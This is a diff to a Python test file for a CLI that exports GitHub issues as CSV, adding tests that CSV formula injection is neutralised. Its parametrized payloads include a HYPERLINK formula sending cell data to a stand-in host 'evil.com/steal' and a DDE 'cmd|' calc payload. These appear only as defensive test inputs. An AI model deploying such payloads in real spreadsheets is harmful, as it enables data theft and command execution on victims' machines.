@@ -68,7 +68,7 @@ def fake_searcher(monkeypatch, issues):
 
 
 def parse_csv(output):
-    return list(csv.reader(io.StringIO(output)))
+    return [row for row in csv.reader(io.StringIO(output)) if row]
 
 
 def test_search_csv_has_exact_header_and_escaped_rows(fake_searcher):
@@ -114,3 +114,69 @@ def test_other_commands_support_csv(fake_searcher, args, expected_rows):
     rows = parse_csv(result.output)
     assert rows[0] == list(CSV_COLUMNS)
     assert len(rows) == expected_rows
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        '=HYPERLINK("http://evil.com/steal?d="&A1,"Click")',
+        "+1+2",
+        "-5+cmd|' /C calc'!A0",
+        "@SUM(A1:A10)",
+        "\t=1+2",
+        "\r=1+2",
+    ],
+)
+def test_csv_formula_injection_neutralised(monkeypatch, payload):
+    iss = Issue(
+        number=99,
+        title=payload,
+        repo="owner/project",
+        url="https://github.com/owner/project/issues/99",
+        state="open",
+        labels=["good first issue"],
+        created_at="2026-09-01T00:00:00Z",
+        stars=10,
+        comments=2,
+    )
+
+    class FakeSearcher:
+        def search(self, **kwargs):
+            return iter([iss])
+
+        def is_seen(self, issue):
+            return False
+
+        def _seen_key(self, issue):
+            return issue.url
+
+        def sort_deterministicly(self, issues):
+            return issues
+
+        _seen = {}
+
+    monkeypatch.setattr("gfi.cli.GitHubSearcher", FakeSearcher)
+
+    result = CliRunner().invoke(cli, ["search", "--csv"])
+    assert result.exit_code == 0
+    rows = parse_csv(result.output)
+    assert rows[0] == list(CSV_COLUMNS)
+    assert rows[1][1] == "'" + payload
+
+
+def test_csv_safe_preserves_numeric_and_safe_strings():
+    from gfi.cli import _csv_safe
+
+    assert _csv_safe(42) == 42
+    assert _csv_safe(-10) == -10
+    assert _csv_safe(0) == 0
+    assert _csv_safe("Normal title") == "Normal title"
+    assert _csv_safe("owner/repo") == "owner/repo"
+    assert _csv_safe("=cmd") == "'=cmd"
+    assert _csv_safe("+cmd") == "'+cmd"
+    assert _csv_safe("-cmd") == "'-cmd"
+    assert _csv_safe("@cmd") == "'@cmd"
+    assert _csv_safe("\t=1+2") == "'\t=1+2"
+    assert _csv_safe("\r=1+2") == "'\r=1+2"
+    assert _csv_safe("") == ""
+
